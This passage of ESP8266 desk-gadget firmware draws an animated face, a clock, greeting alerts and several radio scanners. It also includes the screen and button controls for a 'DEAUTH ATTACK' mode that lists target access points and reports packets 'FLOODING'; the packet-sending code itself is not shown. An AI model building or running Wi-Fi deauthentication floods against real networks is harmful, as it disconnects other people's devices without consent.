  unsigned long elapsed = now - smsAlertStartTime;

  unsigned long cycleTime = elapsed % 7000;

  if (cycleTime >= 4500) {
    display.clearDisplay();

    if (activeAlertType == 2) {
      display.fillRoundRect(24, 31, 30, 14, 7, SSD1306_WHITE);
      display.fillRect(24, 31, 30, 7, SSD1306_BLACK);
      display.fillRoundRect(74, 31, 30, 14, 7, SSD1306_WHITE);
      display.fillRect(74, 31, 30, 7, SSD1306_BLACK);

      int zPos = (now / 350) % 4;
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE);
      if (zPos >= 1) { display.setCursor(98, 22); display.print("z"); }
      if (zPos >= 2) { display.setCursor(106, 14); display.print("Z"); }
      if (zPos >= 3) { display.setCursor(114, 6);  display.print("Z"); }
    } else {
      int heartY = 19 + (int)(sin(now * 0.012) * 3.0);
      int heartScale = ((now / 200) % 2 == 0) ? 3 : 2;

      drawHappyArchedEye(24, 21, 30);
      drawHappyArchedEye(74, 21, 30);
      drawSmallHeart(64, heartY, heartScale);
    }
    display.display();
  } else {
    const char* renderStr;
    if (activeAlertType == 1) {
      renderStr = "Good Morning!";
    } else if (activeAlertType == 2) {
      renderStr = "Good Night & Sweet Dreams!";
    } else {
      renderStr = (scheduledSmsText[0] != '\0') ? scheduledSmsText : "Happy Birthday!";
    }

    int textPixelWidth = strlen(renderStr) * 12;

    if (now - lastMarqueeShift >= 25) {
      lastMarqueeShift = now;
      marqueeScrollX -= 3;
      if (marqueeScrollX < -textPixelWidth) {
        marqueeScrollX = SCREEN_WIDTH;
      }
    }

    display.clearDisplay();
    display.setTextSize(2);
    display.setTextWrap(false);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(marqueeScrollX, 24);
    display.print(renderStr);
    display.display();
  }
}

void checkScheduledSms() {
  if (isSmsAlertActive) return;

  time_t now = time(nullptr);
  if (now < 100000) return;

  struct tm* t = localtime(&now);

  if (goodMorningEnabled && t->tm_hour == 7 && t->tm_min == 0) {
    if (lastMorningTriggerDay != t->tm_mday) {
      lastMorningTriggerDay = t->tm_mday;
      activeAlertType = 1;
      isSmsAlertActive = true;
      smsAlertStartTime = millis();
      marqueeScrollX = SCREEN_WIDTH;
      setOledBrightness(userBrightness);
      return;
    }
  }

  if (goodNightEnabled && t->tm_hour == 22 && t->tm_min == 30) {
    if (lastNightTriggerDay != t->tm_mday) {
      lastNightTriggerDay = t->tm_mday;
      activeAlertType = 2;
      isSmsAlertActive = true;
      smsAlertStartTime = millis();
      marqueeScrollX = SCREEN_WIDTH;
      setOledBrightness(userBrightness);
      return;
    }
  }

  if (wishTarget.armed) {
    if ((t->tm_year + 1900) == (int)wishTarget.year &&
        (t->tm_mon + 1)     == (int)wishTarget.month &&
        t->tm_mday          == (int)wishTarget.day &&
        t->tm_hour          == (int)wishTarget.hour &&
        t->tm_min           == (int)wishTarget.minute) {

      activeAlertType = 0;
      isSmsAlertActive = true;
      smsAlertStartTime = millis();
      marqueeScrollX = SCREEN_WIDTH;
      setOledBrightness(userBrightness);
      clearScheduledWish();
    }
  }
}

void drawEmoFace() {
  unsigned long now = millis();

  if (currentEmotion != EMO_NORMAL && currentEmotion != EMO_SLEEP && currentEmotion != EMO_LOVE) {
    if (now - emotionHoldStartTime > EMOTION_HOLD_MS) {
      currentEmotion = isNightWindow() ? EMO_SLEEP : EMO_NORMAL;
    }
  }

  display.clearDisplay();

  const int eyeW = 30;
  const int leftEyeBaseX = 24;
  const int rightEyeBaseX = 74;
  const int eyeBaseY = 17;

  if (currentEmotion == EMO_LOVE) {
    int heartY = 19 + (int)(sin(now * 0.012) * 3.0);
    int heartScale = ((now / 200) % 2 == 0) ? 3 : 2;

    drawHappyArchedEye(leftEyeBaseX, eyeBaseY + 4, eyeW);
    drawHappyArchedEye(rightEyeBaseX, eyeBaseY + 4, eyeW);
    drawSmallHeart(64, heartY, heartScale);
    display.display();
    return;
  }

  if (currentEmotion == EMO_SLEEP) {
    display.fillRoundRect(leftEyeBaseX, eyeBaseY + 14, eyeW, 14, 7, SSD1306_WHITE);
    display.fillRect(leftEyeBaseX, eyeBaseY + 14, eyeW, 7, SSD1306_BLACK);
    display.fillRoundRect(rightEyeBaseX, eyeBaseY + 14, eyeW, 14, 7, SSD1306_WHITE);
    display.fillRect(rightEyeBaseX, eyeBaseY + 14, eyeW, 7, SSD1306_BLACK);

    if (now - lastZzzAnim > 350) {
      lastZzzAnim = now;
      zzzStep = (zzzStep + 1) % 4;
    }
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    if (zzzStep >= 1) { display.setCursor(98, 22); display.print("z"); }
    if (zzzStep >= 2) { display.setCursor(106, 14); display.print("Z"); }
    if (zzzStep >= 3) { display.setCursor(114, 6);  display.print("Z"); }

    display.display();
    return;
  }

  if (currentEmotion == EMO_SHOCKED) {
    int lx = leftEyeBaseX + 15;
    int rx = rightEyeBaseX + 15;
    int cy = eyeBaseY + 15;
    display.fillCircle(lx, cy, 18, SSD1306_WHITE);
    display.fillCircle(rx, cy, 18, SSD1306_WHITE);
    display.fillCircle(lx, cy, 6, SSD1306_BLACK);
    display.fillCircle(rx, cy, 6, SSD1306_BLACK);
    display.display();
    return;
  }

  if (currentEmotion == EMO_SUSPICIOUS) {
    display.fillRoundRect(leftEyeBaseX, eyeBaseY + 8, eyeW, 16, 4, SSD1306_WHITE);
    display.fillRoundRect(rightEyeBaseX, eyeBaseY + 8, eyeW, 16, 4, SSD1306_WHITE);
    display.fillTriangle(leftEyeBaseX, eyeBaseY + 8, leftEyeBaseX + eyeW, eyeBaseY + 8, leftEyeBaseX + eyeW, eyeBaseY + 14, SSD1306_BLACK);
    display.fillTriangle(rightEyeBaseX, eyeBaseY + 8, rightEyeBaseX + eyeW, eyeBaseY + 8, rightEyeBaseX, eyeBaseY + 14, SSD1306_BLACK);
    display.fillRect(leftEyeBaseX + 10, eyeBaseY + 12, 10, 8, SSD1306_BLACK);
    display.fillRect(rightEyeBaseX + 10, eyeBaseY + 12, 10, 8, SSD1306_BLACK);
    display.display();
    return;
  }

  if (currentEmotion == EMO_WINK) {
    drawDeskBuddyEye(leftEyeBaseX, eyeBaseY, eyeW, 30, 0, 0);
    display.fillRoundRect(rightEyeBaseX, eyeBaseY + 14, eyeW, 4, 2, SSD1306_WHITE);
    display.display();
    return;
  }

  if (!isBlinking && (now - lastEyeTargetShift > (unsigned long)random(2200, 4200))) {
    lastEyeTargetShift = now;
    if (random(0, 100) < 35) {
      isBlinking = true;
      blinkStartTime = now;
      targetEyeH = 4.0;
    } else {
      targetEyeX = random(-7, 8);
      targetEyeY = random(-4, 5);
    }
  }

  if (isBlinking && (now - blinkStartTime > 130)) {
    isBlinking = false;
    targetEyeH = 30.0;
  }

  currentEyeX += (targetEyeX - currentEyeX) * 0.25;
  currentEyeY += (targetEyeY - currentEyeY) * 0.25;
  currentEyeH += (targetEyeH - currentEyeH) * 0.35;

  int renderH = constrain((int)currentEyeH, 4, 30);
  int lx = constrain(leftEyeBaseX + (int)currentEyeX, 4, 46);
  int rx = constrain(rightEyeBaseX + (int)currentEyeX, 54, 96);
  int y  = constrain(eyeBaseY + (int)currentEyeY + (30 - renderH) / 2, 6, 32);

  int pupilOffsetX = constrain((int)(currentEyeX * 0.5), -4, 4);
  int pupilOffsetY = constrain((int)(currentEyeY * 0.5), -3, 3);

  drawDeskBuddyEye(lx, y, eyeW, renderH, pupilOffsetX, pupilOffsetY);
  drawDeskBuddyEye(rx, y, eyeW, renderH, pupilOffsetX, pupilOffsetY);

  display.display();
}

void drawClockUI() {
  time_t now = time(nullptr);
  struct tm* timeinfo = localtime(&now);

  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);

  char timeStr[10];
  int hour12 = timeinfo->tm_hour % 12;
  if (hour12 == 0) hour12 = 12;
  const char* ampm = (timeinfo->tm_hour >= 12) ? "PM" : "AM";

  snprintf(timeStr, sizeof(timeStr), "%02d:%02d:%02d", hour12, timeinfo->tm_min, timeinfo->tm_sec);

  display.setTextSize(2);
  display.setCursor(4, 14);
  display.print(timeStr);

  display.setTextSize(1);
  display.setCursor(104, 20);
  display.print(ampm);

  const char* days[] = {"Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"};
  const char* months[] = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};

  display.setTextSize(1);
  display.setCursor(6, 40);
  display.printf("%s, %02d %s %04d",
                 days[timeinfo->tm_wday],
                 timeinfo->tm_mday,
                 months[timeinfo->tm_mon],
                 timeinfo->tm_year + 1900);

  display.display();
}

void drawDeauthUI() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);

  display.setCursor(0, 0);
  display.println("--- DEAUTH ATTACK ---");
  display.drawLine(0, 9, 127, 9, SSD1306_WHITE);

  if (deauthScanning || deauthApCount == 0) {
    display.setCursor(0, 24);
    display.println("Scanning networks...");
    display.setCursor(0, 38);
    display.println("Targets appear soon");
    display.display();
    return;
  }

  display.setCursor(0, 13);
  display.printf("Targets:%d/%d", deauthCurrentAp + 1, deauthApCount);

  display.setCursor(0, 24);
  String s = String(deauthAps[deauthCurrentAp].ssid);
  if (s.length() > 20) s = s.substring(0, 20);
  display.print(s);

  display.setCursor(0, 36);
  display.printf("CH:%d  PKTS:%u", deauthAps[deauthCurrentAp].channel,
                 (unsigned int)deauthPacketsSent);

  display.setCursor(0, 46);
  display.printf("MAC:%02X:%02X:%02X:%02X:%02X:%02X",
                 deauthAps[deauthCurrentAp].mac[0], deauthAps[deauthCurrentAp].mac[1],
                 deauthAps[deauthCurrentAp].mac[2], deauthAps[deauthCurrentAp].mac[3],
                 deauthAps[deauthCurrentAp].mac[4], deauthAps[deauthCurrentAp].mac[5]);

  if (!deauthRunning) {
    display.fillRect(0, 56, 128, 8, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(34, 56);
    display.print("** PAUSED **");
  } else {
    display.setCursor(0, 56);
    display.print("FLOODING (hold:pause)");
  }

  display.display();
}

void drawConfigUI() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);

  display.setCursor(0, 0);
  display.println("--- AP CONFIG ---");
  display.drawLine(0, 9, 127, 9, SSD1306_WHITE);

  display.setCursor(0, 13);
  display.println("SSID: COCO-Desk-Buddy");
  display.setCursor(0, 24);
  display.println("Pass: 12345678");

  display.setCursor(0, 36);
  display.printf("Bright: %d/255\n", userBrightness);
  display.setCursor(0, 46);
  display.printf("AutoLock: %s (%ds)\n", autoLockEnabled ? "ON" : "OFF", autoLockSeconds);

  display.setCursor(0, 56);
  display.println("http://192.168.4.1");

  display.display();
}

void drawRadarUI() {
  display.clearDisplay();

  const int centerX = 40;
  const int centerY = 32;
  const int maxRadius = 30;

  display.drawCircle(centerX, centerY, 10, SSD1306_WHITE);
  display.drawCircle(centerX, centerY, 20, SSD1306_WHITE);
  display.drawCircle(centerX, centerY, maxRadius, SSD1306_WHITE);
  display.drawLine(centerX - maxRadius, centerY, centerX + maxRadius, centerY, SSD1306_WHITE);
  display.drawLine(centerX, centerY - maxRadius, centerX, centerY + maxRadius, SSD1306_WHITE);

  int sweepX = centerX + cos(sweepAngle) * maxRadius;
  int sweepY = centerY + sin(sweepAngle) * maxRadius;
  display.drawLine(centerX, centerY, sweepX, sweepY, SSD1306_WHITE);

  int activeCount = 0;
  int closestRSSI = -100;

  for (int i = 0; i < MAX_TARGETS; i++) {
    if (targets[i].active) {
      if (millis() - targets[i].lastSeen > 6000) {
        targets[i].active = false;
        continue;
      }
      activeCount++;
      if (targets[i].rssi > closestRSSI) {
        closestRSSI = targets[i].rssi;
      }

      int dist = map(targets[i].rssi, -95, -35, maxRadius - 2, 4);
      dist = constrain(dist, 4, maxRadius - 2);

      int tx = centerX + cos(targets[i].angle) * dist;
      int ty = centerY + sin(targets[i].angle) * dist;
      display.fillRect(tx - 1, ty - 1, 3, 3, SSD1306_WHITE);
    }
  }

  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(76, 4);
  display.print("RADAR");
  display.setCursor(76, 18);
  display.printf("CH: %2d", currentChannel);
  display.setCursor(76, 32);
  display.printf("TGT: %d", activeCount);
  display.setCursor(76, 46);
  if (activeCount > 0) {
    display.printf("%ddBm", closestRSSI);
  } else {
    display.print("SWEEP");
  }

  display.display();
}

void drawScannerUI() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);

  display.setCursor(0, 0);
  display.printf("NETWORKS FOUND: %d", totalNetworksFound);
  display.drawLine(0, 9, 127, 9, SSD1306_WHITE);

  int yPos = 12;
  int displayedCount = 0;

  for (int i = 0; i < totalNetworksFound && displayedCount < 4; i++) {
    String ssidName = WiFi.SSID(i);
    ssidName.trim();
    if (ssidName.length() == 0) continue;
    if (ssidName.length() > 11) ssidName = ssidName.substring(0, 11);

    display.setCursor(0, yPos);
    display.printf("%-11s %2ddB", ssidName.c_str(), WiFi.RSSI(i));
    yPos += 11;
    displayedCount++;
  }

  if (displayedCount == 0) {
    display.setCursor(0, 24);
    display.println(scanningInProgress ? "Scanning..." : "No visible APs");
  }

  display.setCursor(0, 56);
  display.print(scanningInProgress ? "Status: Scanning..." : "Status: Active");

  display.display();
}

void drawTripwireUI(float delta, int currentRssi, bool motionAlert) {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);

  display.setCursor(0, 0);
  display.printf("TRIPWIRE: %2ddBm", currentRssi);
  display.drawLine(0, 9, 127, 9, SSD1306_WHITE);

  if (motionAlert) {
    display.fillRect(0, 11, 128, 10, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(18, 12);
    display.print("** MOTION ALERT **");
    display.setTextColor(SSD1306_WHITE);
  } else {
    display.setCursor(0, 12);
    display.printf("D:%.1f TH:%.1f", delta, dynamicThreshold);
  }

  display.drawFastHLine(0, 42, 128, SSD1306_WHITE);

  for (int x = 0; x < WAVE_POINTS - 1; x++) {
    int idx1 = (waveIndex + x) % WAVE_POINTS;
    int idx2 = (waveIndex + x + 1) % WAVE_POINTS;
    display.drawLine(x, waveBuffer[idx1], x + 1, waveBuffer[idx2], SSD1306_WHITE);
  }

  display.display();
}

void drawDecoderUI() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);

  display.setCursor(0, 0);
  display.println("--- IR DECODER ---");

  display.setCursor(0, 16);
  display.print("Proto: ");
  display.println(lastProtocol);

  display.setCursor(0, 28);
  display.print("Code : ");
  display.println(lastHexCode);

  display.setCursor(0, 40);
  display.printf("Bits : %d-bit\n", lastBits);

  display.setCursor(0, 54);
  display.print("TSOP Receiver: Ready");

  display.display();
}

// 2.4GHz nRF24L01 Spectrum & Packet Counter UI
void drawNrfScannerUI() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);

  // Wiring self-test: if the nRF24 doesn't answer on SPI, say so clearly
  if (!nrfRadioOk) {
    display.setCursor(0, 0);
    display.print("--- 2.4G SCANNER ---");
    display.drawLine(0, 9, 127, 9, SSD1306_WHITE);
    display.setTextSize(2);
    display.setCursor(4, 18);
    display.print("NRF24 NOT");
    display.setCursor(4, 38);
    display.print("FOUND!");
    display.setTextSize(1);
    display.setCursor(0, 57);
    display.print("Check CE/CSN wiring");
    display.display();
    return;
  }

  // ---------- Header ----------
  if (nrfDeviceFound) {
    bool blinkPhase = ((millis() / 140) % 2 == 0);
    display.fillRect(0, 0, 128, 12, blinkPhase ? SSD1306_WHITE : SSD1306_BLACK);
    display.setTextColor(blinkPhase ? SSD1306_BLACK : SSD1306_WHITE);
    display.setCursor(4, 2);
    display.print("SIGNAL FOUND CH:");
    display.print(nrfFoundChannel);
    display.setTextColor(SSD1306_WHITE);
  } else {
    display.setCursor(0, 0);
    display.printf("PKTS:%u", (unsigned int)totalNrfHits);
    display.setCursor(70, 0);
    display.printf("PEAK:%dM", 2400 + peakChannel);
    display.setCursor(0, 10);
    display.print("2.4GHz SPECTRUM HISTORY");
  }

  // ---------- Compact scrolling graph (NOT fullscreen) ----------
  const int gL = 8;     // left
  const int gT = 22;    // top
  const int gR = 120;   // right
  const int gB = 46;    // bottom
  const int gW = gR - gL + 1;
  const int gH = gB - gT + 1;

  display.drawRect(gL, gT, gW, gH, SSD1306_WHITE);

  int prevY = gB;
  for (int x = 0; x < gW; x++) {
    uint8_t v = nrfScrollBuf[x];
    int bar = map(v, 0, 64, 0, gH - 3);
    bar = constrain(bar, 0, gH - 3);
    int y = gB - bar;
    int sx = gL + x;

    display.drawLine(sx, prevY, sx, y, SSD1306_WHITE); // smooth top line
    if (bar > 0) display.fillRect(sx, y, 1, bar, SSD1306_WHITE);
    prevY = y;
  }

  // Live marker on the newest (right) column
  display.fillTriangle(gR - 1, gB + 2, gR + 4, gB + 2, gR + 1, gB + 7, SSD1306_WHITE);

  // ---------- Bottom labels ----------
  display.setCursor(0, 52);
  display.print("<- OLD");
  display.setCursor(48, 52);
  display.print("SCROLLING");
  display.setCursor(102, 52);
  display.print("NEW");

  display.display();
}

void scanNrfChannels() {
  if (!nrfRadioOk) return;

  peakValue = 0;
  peakChannel = 0;
  unsigned long now = millis();

  for (uint8_t i = 0; i < NRF_NUM_CHANNELS; i++) {
    radio.setChannel(i);
    radio.startListening();
    delayMicroseconds(350);            // RPD/carrier need RX settle time

    bool rpd = radio.testRPD();
    bool cd  = radio.testCarrier();
    uint8_t pk = 0;
    while (radio.available() && pk < 3) {   // drain up to 3 real packets
      radio.read(nrfRxScratch, 32);
      pk++;
    }
    if (radio.available()) radio.flush_rx();

    radio.stopListening();

    bool activity = rpd || cd || (pk > 0);

    if (activity) {
      if (nrfValues[i] <= 60) nrfValues[i] += 4;   // fast attack
      nrfStreak[i]++;
      totalNrfHits++;
      triggerLedAlert();

      // Signal present for several sweeps in a row = real device, not noise
      if (nrfStreak[i] >= NRF_DETECTION_STREAK) {
        nrfDeviceFound = true;
        nrfFoundChannel = i;
        nrfFoundAt = now;
        if (isDeviceLocked) setEmotion(EMO_SHOCKED);
      }
    } else {
      nrfStreak[i] = 0;
      if (nrfHold[i] > 0) {
        nrfHold[i]--;                             // freeze the bar so you can see it
      } else if (nrfValues[i] >= 4) {
        nrfHold[i] = 30;                          // ~1.2s hold after last hit
      } else if (nrfValues[i] > 0) {
        nrfValues[i]--;                           // slow decay
      }
    }

    if (nrfValues[i] > peakValue) {
      peakValue = nrfValues[i];
      peakChannel = i;
    }
  }

  // --- Push sweep summary into scrolling history (right-to-left) ---
  uint8_t sweepMax = 0;
  for (uint8_t i = 0; i < NRF_NUM_CHANNELS; i++) {
    if (nrfValues[i] > sweepMax) sweepMax = nrfValues[i];
  }
  for (uint8_t s = 0; s < 2; s++) {              // scroll speed: columns per sweep
    for (uint8_t i = 0; i < GRAPH_WIDTH - 1; i++) {
      nrfScrollBuf[i] = nrfScrollBuf[i + 1];     // shift left
    }
    nrfScrollBuf[GRAPH_WIDTH - 1] = sweepMax;    // newest at right edge
  }

  if (nrfDeviceFound && (now - nrfFoundAt > NRF_FOUND_BANNER_MS)) {
    nrfDeviceFound = false;
  }
}

// Startup connection routine
void syncTimeAtStartup() {
  shutoffLeds();

  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(2);
  display.setCursor(40, 2);
  display.print("COCO");
  display.drawFastHLine(14, 20, 100, SSD1306_WHITE);

  display.setTextSize(1);
  display.setCursor(0, 26);
  display.print("Connecting to AP:");
  display.setCursor(0, 38);
  display.print(target_ssid[0] ? target_ssid : "[NO SSID SET]");
  display.display();

  if (!target_ssid[0]) {
    delay(1500);
    return;
  }

  WiFi.mode(WIFI_STA);
  WiFi.begin(target_ssid, target_password);

  unsigned long start = millis();
  int dotCount = 0;
  while (WiFi.status() != WL_CONNECTED && millis() - start < 8000) {
    if (digitalRead(BUTTON_PIN) == LOW) {
      configureMode(MODE_AP_CONFIG);
      return;
    }

    display.fillRect(0, 50, 128, 12, SSD1306_BLACK);
    display.setCursor(0, 50);
    display.print("Connecting");
    for (int i = 0; i < dotCount; i++) display.print(".");
    display.display();

    dotCount = (dotCount + 1) % 4;
    delay(250);
  }

  if (WiFi.status() == WL_CONNECTED) {
    display.clearDisplay();
    display.setTextSize(2);
    display.setCursor(40, 2);
    display.print("COCO");
    display.drawFastHLine(14, 20, 100, SSD1306_WHITE);

    display.setTextSize(1);
    display.setCursor(0, 26);
    display.print("Wi-Fi Connected!");
    display.setCursor(0, 38);
    display.print("Setting Date & Time...");
    display.display();

    configTime(gmtOffset_sec, daylightOffset_sec, ntpServer);

    time_t now = time(nullptr);
    start = millis();
    while (now < 100000 && millis() - start < 4000) {
      delay(150);
      now = time(nullptr);
    }

    if (now >= 100000) {
      struct tm* t = localtime(&now);
      display.clearDisplay();
      display.setTextSize(2);
      display.setCursor(40, 2);
      display.print("COCO");
      display.drawFastHLine(14, 20, 100, SSD1306_WHITE);

      display.setTextSize(1);
      display.setCursor(0, 28);
      display.printf("Time: %02d:%02d:%02d", t->tm_hour, t->tm_min, t->tm_sec);
      display.setCursor(0, 42);
      display.printf("Date: %02d-%02d-%04d", t->tm_mday, t->tm_mon + 1, t->tm_year + 1900);
      display.display();
      delay(1200);
    }
  } else {
    display.clearDisplay();
    display.setTextSize(2);
    display.setCursor(40, 2);
    display.print("COCO");
    display.drawFastHLine(14, 20, 100, SSD1306_WHITE);

    display.setTextSize(1);
    display.setCursor(0, 30);
    display.print("Wi-Fi Timeout!");
    display.display();
    delay(1000);
  }
}

void setup() {
  pinMode(EXTERNAL_LED, OUTPUT);
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  pinMode(IR_RECV_PIN, INPUT_PULLUP);

  shutoffLeds();

  loadCredentials();

  server.on("/", handleRoot);
  server.on("/save", HTTP_POST, handleConfigSave);

  Wire.begin(OLED_SDA, OLED_SCL);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.setRotation(2);
  display.clearDisplay();
  display.display();

  setOledBrightness(userBrightness);

  SPI.begin();
  nrfRadioOk = radio.begin();
  radio.powerDown();

  syncTimeAtStartup();

  lastUserActivity = millis();

  if (currentMode != MODE_AP_CONFIG) {
    configureMode(MODE_RADAR);
  }
}

void loop() {
  unsigned long currentMillis = millis();

  if (isSmsAlertActive) {
    bool strobe = ((currentMillis / 100) % 2 == 0);
    digitalWrite(EXTERNAL_LED, strobe ? HIGH : LOW);
  } else {
    if (alertLedActive && (currentMillis - alertLedStart >= LED_ALERT_DURATION)) {
      alertLedActive = false;
      shutoffLeds();
    }
  }

  checkScheduledSms();

  if (isSmsAlertActive && (currentMillis - smsAlertStartTime >= SMS_DISPLAY_DURATION)) {
    isSmsAlertActive = false;
    shutoffLeds();
    display.clearDisplay();
  }

  if (currentMillis - lastButtonCheck >= 25) {
    lastButtonCheck = currentMillis;
    bool pinState = (digitalRead(BUTTON_PIN) == LOW);

    if (pinState && !buttonIsPressed) {
      buttonIsPressed = true;
      buttonPressStartTime = currentMillis;
      holdThresholdMet = false;
    }
    else if (pinState && buttonIsPressed) {
      unsigned long heldTime = currentMillis - buttonPressStartTime;

      if (!holdThresholdMet) {
        if (isDeviceLocked && heldTime >= 700) {
          holdThresholdMet = true;
          clickCount = 0;
          isPeekClockActive = false;
          setEmotion(EMO_LOVE);
        }
        else if (!isDeviceLocked && currentMode == MODE_DEAUTH && heldTime >= 1200) {
          holdThresholdMet = true;
          clickCount = 0;
          deauthRunning = !deauthRunning;
        }
        else if (!isDeviceLocked && heldTime >= 2000) {
          holdThresholdMet = true;
          clickCount = 0;
          lastUserActivity = currentMillis;
          isClockModeActive = false;
          configureMode(MODE_AP_CONFIG);
        }
        else if (!isDeviceLocked && heldTime >= 400) {
          display.fillRect(10, 56, (heldTime - 400) * 108 / 1600, 4, SSD1306_WHITE);
          display.display();
        }
      }
    }
    else if (!pinState && buttonIsPressed) {
      buttonIsPressed = false;
      unsigned long duration = currentMillis - buttonPressStartTime;

      if (duration < 600 && !holdThresholdMet) {
        clickCount++;
        lastClickTime = currentMillis;

        if (isSmsAlertActive) {
          isSmsAlertActive = false;
          shutoffLeds();
          clickCount = 0;
          display.clearDisplay();
        }
        else if (clickCount == 2) {
          clickCount = 0;

          if (isDeviceLocked) {
            unlockDevice();
          } else {
            enterLockScreen();
          }
        }
        else if (clickCount >= 3) {
          clickCount = 0;
          saveAutoLockState(!autoLockEnabled);
          isBannerActive = true;
          bannerStartTime = currentMillis;
        }
      }
    }

    if (clickCount == 1 && (currentMillis - lastClickTime > DOUBLE_CLICK_GAP)) {
      clickCount = 0;

      if (isDeviceLocked) {
        isPeekClockActive = true;
        peekClockStartTime = currentMillis;
        display.clearDisplay();
      } else {
        lastUserActivity = currentMillis;

        if (isClockModeActive) {
          isClockModeActive = false;
          setOledBrightness(userBrightness);
          display.clearDisplay();
        } else {
          DeviceMode nextMode;
          if (currentMode == MODE_RADAR)             nextMode = MODE_SCANNER;
          else if (currentMode == MODE_SCANNER)     nextMode = MODE_RF_TRIPWIRE;
          else if (currentMode == MODE_RF_TRIPWIRE) nextMode = MODE_IR_DECODER;
          else if (currentMode == MODE_IR_DECODER)  nextMode = MODE_NRF_SCANNER;
          else if (currentMode == MODE_NRF_SCANNER) nextMode = MODE_DEAUTH;
          else                                      nextMode = MODE_RADAR;

          configureMode(nextMode);
        }
      }
    }
  }

  if (!isDeviceLocked && currentMode != MODE_AP_CONFIG) {
    if (autoLockEnabled && (currentMillis - lastUserActivity >= (unsigned long)autoLockSeconds * 1000UL)) {
      enterLockScreen();
    }
    else if (!isClockModeActive && (currentMillis - lastUserActivity >= CLOCK_TIMEOUT_MS)) {
      isClockModeActive = true;
      if (autoDimEnabled) {
        uint8_t dimLevel = map(userBrightness, 1, 255, 1, 35);
        setOledBrightness(dimLevel);
      } else {
        setOledBrightness(userBrightness);
      }
      display.clearDisplay();
    }
  }

  if (isDeviceLocked && isPeekClockActive && (currentMillis - peekClockStartTime >= PEEK_CLOCK_DURATION)) {
    isPeekClockActive = false;
    display.clearDisplay();
  }

  if (isBannerActive && (currentMillis - bannerStartTime >= BANNER_DURATION)) {
    isBannerActive = false;
    display.clearDisplay();
  }

  if (isSmsAlertActive) {
    drawBirthdayWishUI();
  } else if (isBannerActive) {
    drawAutoLockBanner();
  } else if (isDeviceLocked) {
    if (isPeekClockActive) {
      if (currentMillis - lastDisplayDraw >= 200) {
        lastDisplayDraw = currentMillis;
        drawClockUI();
      }
    } else {
      if (currentMillis - lastDisplayDraw >= 30) {
        lastDisplayDraw = currentMillis;
        drawEmoFace();
      }
    }
  } else if (isClockModeActive) {
    if (currentMillis - lastDisplayDraw >= 500) {
      lastDisplayDraw = currentMillis;
      drawClockUI();
    }
  }

  switch (currentMode) {
    case MODE_RADAR: {
      if (currentMillis - lastChannelHop >= 180) {
        lastChannelHop = currentMillis;
        currentChannel++;
        if (currentChannel > 13) currentChannel = 1;
        wifi_set_channel(currentChannel);
      }

      if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive && (currentMillis - lastDisplayDraw >= 50)) {
        lastDisplayDraw = currentMillis;
        sweepAngle += 0.15;
        if (sweepAngle >= 2 * PI) sweepAngle = 0;
        drawRadarUI();
      }
      break;
    }

    case MODE_SCANNER: {
      if (!isDeviceLocked) {
        if (!scanningInProgress && (currentMillis - lastScanTime >= SCAN_INTERVAL)) {
          lastScanTime = currentMillis;
          triggerWifiScan();
        }

        if (!isClockModeActive && !isBannerActive && !isSmsAlertActive && (currentMillis - lastDisplayDraw >= 200)) {
          lastDisplayDraw = currentMillis;
          drawScannerUI();
        }
      }
      break;
    }

    case MODE_RF_TRIPWIRE: {
      if (WiFi.status() != WL_CONNECTED) {
        if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive && (currentMillis - lastDisplayDraw >= 300)) {
          lastDisplayDraw = currentMillis;
          display.clearDisplay();
          display.setTextColor(SSD1306_WHITE);
          display.setTextSize(1);
          display.setCursor(0, 24);
          display.println("Connecting to AP...");
          display.display();
        }
        break;
      }

      if (!baselineInitialized) {
        baselineRSSI = (float)WiFi.RSSI();
        baselineInitialized = true;
        isCalibrating = true;
        calibrationStartTime = currentMillis;
        maxNoiseObserved = 0.0;
        break;
      }

      if (currentMillis - lastSampleTime >= SAMPLE_RATE_MS) {
        lastSampleTime = currentMillis;
        int currentRssi = WiFi.RSSI();

        baselineRSSI = (EMA_ALPHA * (float)currentRssi) + ((1.0 - EMA_ALPHA) * baselineRSSI);
        float delta = abs((float)currentRssi - baselineRSSI);

        if (isCalibrating) {
          if (delta > maxNoiseObserved) maxNoiseObserved = delta;

          unsigned long elapsed = currentMillis - calibrationStartTime;
          if (elapsed >= 5000) {
            dynamicThreshold = maxNoiseObserved + 1.0;
            if (dynamicThreshold < 2.0) dynamicThreshold = 2.0;
            isCalibrating = false;
          }

          if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive) {
            display.clearDisplay();
            display.setTextColor(SSD1306_WHITE);
            display.setTextSize(1);
            display.setCursor(0, 8);
            display.println("CALIBRATING ROOM...");
            display.setCursor(0, 24);
            display.printf("Remain: %lus", (5000 - elapsed) / 1000 + 1);
            display.setCursor(0, 38);
            display.printf("Noise : %.1fdB", maxNoiseObserved);
            display.setCursor(0, 50);
            display.println("Keep area clear!");
            display.display();
          }
          break;
        }

        if (delta >= dynamicThreshold) {
          lastMotionDetected = currentMillis;
          triggerLedAlert();
          if (isDeviceLocked) setEmotion(EMO_SHOCKED);
        }

        bool isMotionActive = (currentMillis - lastMotionDetected < ALARM_HOLD_TIME);
